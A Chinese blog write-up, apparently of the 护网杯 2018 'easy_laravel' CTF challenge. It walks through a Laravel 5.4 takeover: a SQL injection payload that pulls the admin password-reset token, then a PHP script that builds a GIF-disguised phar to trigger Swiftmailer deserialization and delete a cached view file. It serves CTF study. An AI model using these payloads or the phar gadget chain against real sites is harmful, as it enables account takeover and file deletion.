<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  
  <title itemprop="name">[护网杯 2018]easy_laravel | Troy3e</title>
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="/css/lib.min.css" media="all">
  <link rel="stylesheet" href="/css/font.css" media="all">
  <link rel="stylesheet" href="/css/insight.css" media="all">
  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "YukinoTroy3e";
  mashiro_option.author_name = "Troy3e";
  mashiro_option.site_url = "https://troyess.com";
  mashiro_option.v_appId = "kEnVX5WKqd0JPt4srHAJkgsC-gzGzoHsz";
  mashiro_option.v_appKey = "h05kFRgBHS516pQ6vIsYtG1B";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>
  <script type="text/javascript">
  var bg = "https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-972788.jpg,https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/nfsgnftn.jpg,https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-994295.png".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
  </style>
</head>
</html>
<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop ">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://troyess.com">
          <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/215153415.png">
        </a>
      </div>
      <div class="header-info">
        <p>Troy3e blog</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="https://space.bilibili.com/129300391" target="_blank" class="social-github" title="bilibili">
                    <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/1188649.jpg">
                  </a>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  <div id="video-container" style="">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu">
    </div>
  </div>
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>
    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono">Yukino</span>
            <span class="shironeko">Troy3e</span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/archives">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
                    归档
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                  </ul>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<div class="pattern-center-blank"></div>

  <div class="pattern-center single-center">
    <!-- 有配图默认渲染第一张 -->
    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141980.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141980.jpg">
    </div>
    <header class="pattern-header single-header">
      <h1 class="entry-title">
      [护网杯 2018]easy_laravel</h1>
      <p class="entry-census">
        <span>
          <a href="">
            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg">
          </a>
        </span>
        <span>
          <a href="">Troy3e</a>
        </span>
        <span class="bull">
        ·</span>
        2021-4-20<span class="bull">
        ·</span>
      <span id="busuanzi_value_page_pv"></span>次阅读</p>
    </header>
  </div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
        
        <div class="entry-content">
          <p>题目注释里的链接已经挂了，BUU直接给了源码，拉下来composer install生成vendor目录。（没换源的话可能会连接超时）</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420160758.png" alt></p>
<p>Artisan是Laravel自带的命令接口。<br>php artisan list可以查看php artisan 命令列表：</p>
<pre><code>命令  说明  备注
php artisan make:resource ? 创建api返回格式化资源    &gt;=5.4版本可用
php artisan make:rule ? 创建validate规则    &gt;=5.4版本可用
php artisan make:exception ?    创建异常类   &gt;=5.4版本可用
php artisan make:factory ?  创建工厂类   &gt;=5.4版本可用
php artisan package:discover    重置包的缓存信息    &gt;=5.4版本可用
php artisan storage:link ？  Create a symbolic link from &quot;public/storage&quot; to &quot;storage/app/public&quot;    &gt;=5.4版本可用
php artisan view:clear  清楚所有已编译的视图文件    &gt;=5.4版本可用

php artisan clear-compiled  清除编译后的类文件   
php artisan down    使应用程序进入维修模式 
php artisan up  退出应用程序的维护模式 
php artisan env 显示当前框架环境    
php artisan fresh   清除包含框架外的支架  
php artisan help    显示命令行的帮助    
php artisan list    列出命令    
php artisan migrate 运行数据库迁移 
php artisan env 显示当前框架环境    
php artisan optimize    为了更好的框架去优化性能    
php artisan serve   在php开发服务器中服务这个应用    --port 8080，--host 0.0.0.0
php artisan tinker  在应用中交互  
php artisan app:name ?  设置应用程序命名空间
php artisan auth:clear-resets   清除过期的密码重置密钥 未使用过
php artisan cache:clear 清除应用程序缓存    
php artisan cache:table 创建一个缓存数据库表的迁移   
php artisan config:cache    创建一个加载配置的缓存文件   
php artisan config:clear    删除配置的缓存文件   
php artisan db:seed 数据库生成模拟数据   
php artisan event:generate  生成event和listen  需要实现配置eventserviceprivoder
php artisan make:command ?  创建一个新的命令处理程序类   
php artisan make:console ?  生成一个Artisan命令   
php artisan key:generate    设置程序密钥  
php artisan make:controller ?   生成一个资源控制类   
php artisan make:middleware ?   生成一个中间件 
php artisan make:migration ?    生成一个迁移文件    
php artisan make:model ?    生成一个Eloquent 模型类    
php artisan make:provider ? 生成一个服务提供商的类 
php artisan make:request ?  生成一个表单消息类   
php artisan migrate:install ?   创建一个迁移库文件   
php artisan make:migration ?    生成一个迁移文件    
php artisan migrate:refresh ?   复位并重新运行所有的迁移    
php artisan migrate:reset ? 回滚全部数据库迁移   
php artisan migrate:rollback ?  回滚最后一个数据库迁移 
php artisan migrate:status  显示列表的迁移 
php artisan queue:failed    列出全部失败的队列工作 
php artisan queue:failed-table ?    创建一个迁移的失败的队列数据库工作表  
php artisan queue:flush 清除全部失败的队列工作 
php artisan queue:forget ?  删除一个失败的队列工作 
php artisan queue:listen ?  监听一个确定的队列工作
php artisan queue:restart   重启现在正在运行的所有队列工作 
php artisan queue:retry 重试一个失败的队列工作 
php artisan queue:subscribe 订阅URL,放到队列上 
php artisan queue:table 创建一个迁移的队列数据库工作表 
php artisan queue:work  进行下一个队列任务
php artisan route:cache 为了更快的路由登记，创建一个路由缓存文件    
php artisan route:clear 清除路由缓存文件    
php artisan route:list  列出全部的注册路由   
php artisan schedule:run    运行预定命令  
php artisan session:table   创建一个迁移的SESSION数据库工作表    
php artisan vendor:publish  发表一些可以发布的有用的资源来自提供商的插件包 
baum包命令
命令  说明  备注
php artisan baum    Get Baum version notice.    
php artisan baum:install ?  Scaffolds a new migration and model suitable for Baum   
</code></pre><p>使用php artisan route:list查看一下已经定义的路由：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420162104.png" alt></p>
<p>或者也可以直接在routers/web.php里查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420162158.png" alt></p>
<p>具体的路由可以在 Illuminate/Routing/Router.php 中找到</p>
<p>可以看到基本所有操作都需要登录，先看UploadController 和 FlagController，两个都使用了一个叫做 admin 的中间件。<br>在 app/Http/Middleware/AdminMiddleware.php 中可以看到代码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420193710.png" alt></p>
<p>看到了管理员的邮箱，尝试新注册一个覆盖：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420193741.png" alt></p>
<p>显示已经注册。<br>不行，那就想办法获取管理员的账号密码。<br>NoteController这里似乎有个sql注入：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420194521.png" alt></p>
<p>这里我试了一会儿都是直接报错，没办法注入，可能是环境的变化？</p>
<p>————————<br>后记：列数错了，没仔细看。。。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420202150.png" alt></p>
<p>事实上这里也无法注出管理员密码，在database/factories/ModelFactory.php里，告诉了我们这里就算注出来密码也是加过密的。</p>
<p>但是在laravel5.4中，重置密码的操作很有意思 Illuminate\Auth\Passwords\PasswordBroker.php<br>首先是发送重置链接的方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420203800.png" alt></p>
<p>如果用户存在的话，会有个token，这里跟进一下create。什么？这是notepad？那没事了，phpStorm启动！</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420204953.png" alt></p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420210041.png" alt></p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420210140.png" alt></p>
<p>这里直接把新生成的token写入了数据库中。<br>总结一下：向管理员邮箱发送重置密码的请求，同时生成一个token存入数据库。随便注册一个账号，然后注出更改密码的token，最后实现直接更改管理员的密码。<br>发送重置请求：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420220741.png" alt></p>
<p>返回500是成功发送。<br>注册个新号注出token：42e06b61aa3a3206902b46785c9744e1bb0e07de494bfe74b65ee8f7217377af</p>
<pre><code>Troy3e&#39; union select 1,token,3,4,5 from password_resets order by created_at desc limit 1-- -
</code></pre><p>记得按时间排序：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420221157.png" alt></p>
<p>重置管理员密码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420221335.png" alt></p>
<p>成功进入：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420221402.png" alt></p>
<p>照理说访问flag应该出flag，但是没有：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420221912.png" alt></p>
<p>这里需要学习一下blade：<br>Blade 是由 Laravel 提供的非常简单但功能强大的模板引擎，不同于其他流行的 PHP 模板引擎，Blade 在视图中并不约束你使用 PHP 原生代码。<br>所有的 Blade 视图最终都会被编译成原生 PHP 代码并缓存起来直到被修改，这意味着对应用的性能而言 Blade 基本上是零开销。<br>Blade 视图文件使用 .blade.php 文件扩展并存放在 resources/views 目录下。<br>这是因为模板编译后的文件没有删除而导致无法显示flag，因此需要删除编译后的模板文件，所以需要知道编译后的文件名（Illuminate\View\Compilers\Compiler.php）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420223953.png" alt></p>
<p>编译后文件的路径由两部分构成第一部分是模板的绝对路径path，第二部分是是缓存路径，又因为缓存路径为/storage/framework/views/，其中/usr/share/nginx/html/是nginx的默认web路径，由提示的得到，path为/usr/share/nginx/html/resources/views/auth/flag.blade.php的sha1值</p>
<p>即可以得到编译后的文件的路径：</p>
<p>/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php</p>
<p>那么接下来要做的就是删掉这个文件。看到旁边还有个上传功能：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420234714.png" alt></p>
<p>上传成功则传到app/public，并且下面check函数存在file_exists函数，可以触发phar反序列化。<br>然后寻找删除文件的地方，全局搜索__destruct：</p>
<p>swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210421000007.png" alt></p>
<p>正是我们要寻找的删除函数。</p>
<p>exp:</p>
<pre><code>&lt;?php
    include(&#39;autoload.php&#39;);
    $a = serialize(new Swift_ByteStream_TemporaryFileByteStream());
    var_dump(unserialize($a));
    var_dump($a);
    $a = preg_replace(&#39;/\/tmp\/FileByteStream[\w]{6}/&#39;, &quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;, $a); //将其换成要删除的文件名
    $a = str_replace(&#39;s:25&#39;, &#39;s:90&#39;, $a);   //修改对应的序列化数据长度
    var_dump($a);
    $b = unserialize($a);

    $p = new Phar(&#39;./tr1ple.phar&#39;, 0);
    $p-&gt;startBuffering();
    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
    $p-&gt;setMetadata($b);
    $p-&gt;addFromString(&#39;test.txt&#39;,&#39;text&#39;);
    $p-&gt;stopBuffering();
    rename(&#39;tr1ple.phar&#39;, &#39;tr1ple.gif&#39;)
?&gt;
</code></pre><p>但是这个在BUU上是打不通的，我仔细对比了buu给的exp和网上复现wp的区别，发现是缓存文件地址的不同，所以用网上的那个是没法成功删掉缓存文件的。exp就不放了，BUU贴出来了，链接在下面。</p>
<p>想了想可能是这个导致的：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210421010359.png" alt></p>
<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210421010708.png" alt></p>
<p>不去深究了，理解就行。</p>
<p>复现思路：<br><a href="https://www.cnblogs.com/tr1ple/p/11044313.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11044313.html</a><br><a href="https://github.com/CTFTraining/huwangbei_2018_easy_laravel/blob/master/exp/easy_laravel_exp.py" target="_blank" rel="noopener">https://github.com/CTFTraining/huwangbei_2018_easy_laravel/blob/master/exp/easy_laravel_exp.py</a><br><a href="https://www.codercto.com/a/31804.html" target="_blank" rel="noopener">https://www.codercto.com/a/31804.html</a></p>

        </div>
        <!-- .entry-content -->
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picturenull"></li>
                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/wechat.jpg"></li>
              </ul>
            </div>
          </div>
        </div>
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
          
            <div class="post-nepre half previous">
          
            <a href="/2021/04/27/红明谷CTF-2021-EasyTP/" rel="prev">
              <div class="background">
                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1143941.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1143941.jpg">
              </div>
              <span class="label">
              Previous Post</span>
              <div class="info">
                <h3>
                [红明谷CTF 2021]EasyTP</h3>
                <hr>
              </div>
            </a>
          </div>
        
        
          
            <div class="post-nepre half next">
          
            <a href="/2021/04/09/NCTF2019-phar-matches-everything/" rel="next">
              <div class="background">
                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png">
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                [NCTF2019]phar matches everything</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
<div id="vcomments"></div>
<script>
  window.onload = function(){
      var valine = new Valine();
      valine.init({
        el: '#vcomments',
        appId: "kEnVX5WKqd0JPt4srHAJkgsC-gzGzoHsz",
        appKey: "h05kFRgBHS516pQ6vIsYtG1B",
        path: window.location.pathname,
        placeholder: "你是我一生只会遇见一次的惊喜 ..."
      })
  }
</script>

      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="" itemprop="url" rel="author">Troy3e</a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i>SteamID：888007034</p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>



    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            // PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    <!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 Troye<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
  <div class="site-info">
    <div class="footertext">
      <div class="img-preload">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
      </div>
      <p style="color: #666666;">&copy 2018</p>
    </div>
    <div class="footer-device">
    <p style="font-family: 'Ubuntu', sans-serif;">
        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
        </span>
      </p>
    </div>
  </div><!-- .site-info -->
</footer>



<!-- <script src="/js/tocbot.js"></script> -->
<script type="text/javascript" src="/js/lib.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="/js/InsightSearch.js"></script>
<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="/js/zoom.min.js"></script>
<script type="text/javascript" src="/js/sakura-app.js"></script>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
<script src="/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
/* <![CDATA[ */
if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures","name":"love.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
} else {
  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures","name":"love.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
}
/* ]]> */

</script>
<script>
$(document).ready(function() {
  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
    if ($(".pattern-center").length > 0) { //有图的情况
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -400,
          scrollSmoothOffset: -85
      });
    } else {
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -85,
          scrollSmoothOffset: -85
      });
    }
    var offsetTop = $('.toc').offset().top - 95;
    window.onscroll = function() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
      if (scrollTop >= offsetTop) {
        $('.toc').addClass('toc-fixed');
      } else {
        $('.toc').removeClass('toc-fixed');
      }
    }
  }
});
</script>

    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>
  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/215153415.png">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">YukinoTroy3e</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="http://github.com/honjun" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
        <a href="http://weibo.com/mashirozx?is_all=1" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
      
        <a href="https://wpa.qq.com/msgrd?v=3&uin=954655431&site=qq&menu=yes" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/archives">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
            归档
          </span>
        </a>
        
          <ul class="sub-menu">
            
          </ul>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    id="819057276"

    server="netease"

    type="playlist"

    fixed="true"

    autoplay="false"

    loop="all"

    order="list"

    preload="auto"

    volume="0.7"

    mutex="true"

    listFolded="false"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
</body>
</html>